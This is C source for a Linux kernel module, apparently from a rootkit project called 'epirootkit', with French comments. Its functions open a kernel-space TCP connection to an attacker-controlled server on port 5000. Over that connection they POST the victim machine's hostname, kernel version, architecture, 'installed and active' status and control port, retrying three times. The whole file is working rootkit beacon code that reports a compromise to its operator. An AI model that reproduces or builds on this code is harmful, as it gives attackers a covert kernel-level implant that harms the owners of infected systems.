#include <linux/module.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/utsname.h>
#include <linux/delay.h>
#include <linux/jiffies.h>
#include "notification.h"
#include "epirootkit.h"

int notifier_attaquant(void)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg;
    struct kvec iov;
    char *json_data;
    char *http_request;
    int ret;
    unsigned char ip_binary[4];
    
    pr_info("epirootkit: DEBUT notification vers %s:5000\n", SERVEUR_ATTAQUANT);
    
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        pr_err("epirootkit: Erreur creation socket notification: %d\n", ret);
        return ret;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5000);
    
    ret = in4_pton(SERVEUR_ATTAQUANT, -1, ip_binary, -1, NULL);
    if (ret == 0) {
        pr_err("epirootkit: Erreur conversion IP attaquant\n");
        sock_release(sock);
        return -EINVAL;
    }
    
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
    
    pr_info("epirootkit: Tentative connexion vers %s:5000\n", SERVEUR_ATTAQUANT);
    
    ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        pr_err("epirootkit: ECHEC connexion vers %s:5000 (erreur: %d)\n", 
                SERVEUR_ATTAQUANT, ret);
        sock_release(sock);
        return ret;
    }
    
    pr_info("epirootkit: Connexion reussie vers %s:5000\n", SERVEUR_ATTAQUANT);
    
    json_data = kmalloc(1024, GFP_KERNEL);
    if (!json_data) {
        sock_release(sock);
        return -ENOMEM;
    }
    
    snprintf(json_data, 1024, 
             "{"
             "\"type\":\"ROOTKIT_ALERT\","
             "\"hostname\":\"%s\","
             "\"kernel\":\"%s %s\","
             "\"architecture\":\"%s\","
             "\"status\":\"INSTALLE ET ACTIF\","
             "\"port_controle\":%d,"
             "\"timestamp\":%lld"
             "}",
             utsname()->nodename,
             utsname()->sysname,
             utsname()->release,
             utsname()->machine,
             PORT_CONTROLE,
             ktime_get_real_seconds());
    
    http_request = kmalloc(2048, GFP_KERNEL);
    if (!http_request) {
        kfree(json_data);
        sock_release(sock);
        return -ENOMEM;
    }
    
    snprintf(http_request, 2048,
             "POST /api/receive_notification HTTP/1.1\r\n"
             "Host: %s:5000\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s",
             SERVEUR_ATTAQUANT,
             strlen(json_data),
             json_data);
    
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = http_request;
    iov.iov_len = strlen(http_request);
    
    pr_info("epirootkit: Envoi requête HTTP de %zu octets\n", strlen(http_request));
    
    ret = kernel_sendmsg(sock, &msg, &iov, 1, strlen(http_request));
    if (ret < 0) {
        pr_err("epirootkit: Erreur envoi notification: %d\n", ret);
    } else {
        pr_info("epirootkit: Notification HTTP envoyée avec succès (%d octets) vers %s:5000\n", 
                ret, SERVEUR_ATTAQUANT);
    }
    
    kfree(json_data);
    kfree(http_request);
    sock_release(sock);
    return ret;
}

int envoyer_alerte_installation(void)
{
    int tentatives = 3;
    int ret;
    
    pr_info("epirootkit: *** DEBUT envoyer_alerte_installation() ***\n");
    
    while (tentatives > 0) {
        pr_info("epirootkit: Tentative %d/3 de notification\n", 4 - tentatives);
        ret = notifier_attaquant();
        if (ret >= 0) {
            pr_info("epirootkit: Notification reussie!\n");
            return ret;
        }
        
        tentatives--;
        if (tentatives > 0) {
            pr_info("epirootkit: Echec, attente 2 secondes avant retry\n");
            msleep(2000);
        }
    }
    
    pr_err("epirootkit: *** ECHEC TOTAL apres 3 tentatives ***\n");
    return ret;
}
